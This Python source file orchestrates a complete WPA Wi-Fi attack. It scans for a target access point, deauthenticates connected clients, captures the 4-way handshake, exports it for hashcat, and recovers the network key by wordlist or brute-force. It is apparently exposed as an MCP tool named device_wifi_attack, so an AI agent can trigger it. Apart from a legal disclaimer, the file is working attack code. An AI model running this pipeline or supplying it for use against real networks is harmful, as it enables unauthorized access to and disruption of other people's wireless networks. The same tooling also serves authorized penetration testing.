#!/usr/bin/env python3
"""End-to-end WPA handshake attack orchestration (device + host).

Full cycle: find the target AP → deauth its clients → capture the 4-way
handshake to a pcap on the device → fetch it → crack by wordlist → if that
fails, optional brute-force by mask.

LEGAL: only run against networks you own or are explicitly authorized to test.
Deauthentication is an active attack and is illegal against third-party networks
in most jurisdictions.

Used by the MCP tool device_wifi_attack and the GUI/TUI; `dev` is a connected
companion_proto.Companion (or any object exposing find_ap/capture_handshake)."""
import os

import wpa_crack as wc
import crackers as ck


def run_attack(dev, ssid="", bssid="", ch=0, wordlist="", brute=False,
               brute_charset="0123456789", brute_length=8, tool="auto",
               capture_secs=20.0, deauth_count=16, rounds=3, local_dir=None,
               log=print, cancel=None):
    """Drive the full cycle (find → deauth → capture → crack → brute) using the
    best available cracker (aircrack-ng/hashcat, else pure-Python). `log` is a
    callable for progress lines; `cancel` an optional threading.Event."""
    out = {"ok": False, "key": None, "ssid": ssid, "bssid": bssid, "ch": ch}

    # 1. resolve target
    if not bssid and ssid:
        log(f"scanning for SSID {ssid!r} …")
        ap = dev.find_ap(ssid)
        if not ap or not ap["bssid"]:
            out["error"] = f"SSID {ssid!r} not found in scan"
            return out
        bssid, ch = ap["bssid"], ap["ch"]
        out.update(bssid=bssid, ch=ch, ssid=ap["ssid"])
        log(f"target: {ap['ssid']} [{bssid}] ch={ch} rssi={ap['rssi']}")
    if not bssid:
        out["error"] = "need ssid= or bssid="
        return out

    # 2-4. capture handshake with deauth bursts
    local = None
    if local_dir:
        os.makedirs(local_dir, exist_ok=True)
        local = os.path.join(local_dir, f"hs_{bssid.replace(':', '')}.pcap")
    log(f"capturing handshake on ch={ch or 'hop'} for {capture_secs:.0f}s, "
        f"{rounds}×{deauth_count} deauth …")
    cap = dev.capture_handshake(bssid=bssid, ch=ch, secs=capture_secs,
                                deauth_count=deauth_count, rounds=rounds, local_path=local)
    out["pcap"] = cap.get("local")
    out["pcap_bytes"] = cap.get("bytes")
    log(f"captured {cap.get('samples')} frames, {cap.get('bytes')} B -> {cap.get('local')} "
        f"(sha {'ok' if cap.get('verified') else 'UNVERIFIED'})")

    if not cap.get("local") or not os.path.isfile(cap["local"]):
        out["error"] = "no pcap fetched"
        return out

    # is there actually a handshake?
    target, crackable = wc.select_target(cap["local"], ssid)
    out["handshakes"] = [h.label() for h in crackable]
    if not target:
        out["error"] = ("no usable handshake captured (try more deauth rounds / move "
                        "closer / a client must be connected)")
        return out
    out["bssid"] = target.ap.hex(":")
    log(f"handshake captured: {target.label()}")
    # export hc22000 alongside (for hashcat / external GPU cracking)
    hc = cap["local"].rsplit(".", 1)[0] + ".hc22000"
    try:
        wc.export_hc22000(cap["local"], hc, ssid)
        out["hc22000"] = hc
    except Exception:  # noqa: BLE001
        hc = ""

    chosen = ck.available_tools()[0] if tool == "auto" else tool
    out["tool"] = chosen

    def ev(e):
        if e.get("type") == "progress":
            log(f"  {e.get('tested', '')} tried @ {e.get('rate', 0):.0f}/s")

    # 5. dictionary attack (real cracker)
    if wordlist:
        log(f"cracking with {chosen} + {os.path.basename(wordlist)} …")
        res = ck.crack_wordlist(cap["local"], wordlist, bssid=out["bssid"], tool=tool,
                                hc22000=hc, on_event=ev, cancel=cancel)
        if res["ok"]:
            out.update(ok=True, key=res["key"], method="wordlist")
            log(f"✓ KEY FOUND (wordlist/{res['tool']}): {res['key']}")
            return out
        log(f"wordlist exhausted ({res.get('tested', 0)} tried via {res['tool']})")

    # 6. brute-force
    if brute:
        log(f"brute {brute_length}×[{brute_charset}] via {chosen} …")
        res = ck.crack_brute(cap["local"], brute_charset, brute_length, bssid=out["bssid"],
                             tool=tool, hc22000=hc, on_event=ev, cancel=cancel)
        if res["ok"]:
            out.update(ok=True, key=res["key"], method="brute")
            log(f"✓ KEY FOUND (brute/{res['tool']}): {res['key']}")
            return out
        log(f"brute exhausted ({res.get('tested', 0)} tried via {res['tool']})")

    out["error"] = "key not found (wordlist/brute exhausted)"
    return out


def format_result(out) -> str:
    lines = [f"target: {out.get('ssid') or '?'} [{out.get('bssid') or '?'}] ch={out.get('ch')}"]
    if out.get("pcap"):
        lines.append(f"pcap: {out['pcap']} ({out.get('pcap_bytes')} B)")
    for h in out.get("handshakes", []):
        lines.append(f"  handshake: {h}")
    if out.get("ok"):
        lines.append(f"✓ KEY FOUND via {out.get('method')}: {out['key']}")
    else:
        lines.append(f"✗ {out.get('error', 'failed')}")
    return "\n".join(lines)
